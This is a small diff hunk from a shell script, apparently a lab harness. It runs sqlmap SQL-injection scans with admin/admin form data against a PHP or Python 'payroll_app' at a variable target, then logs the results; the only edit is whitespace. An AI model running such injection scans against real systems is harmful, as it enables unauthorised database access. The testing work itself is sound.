@@ -14,7 +14,7 @@ then
 	then	
 		sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK"
 	elif [ $SERVER == "py" ]
-	then 
+	then 	
 		sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK"
 	fi
 	tail -n 1 /root/.sqlmap/output/192.168.0.122/log >> dbres.txt
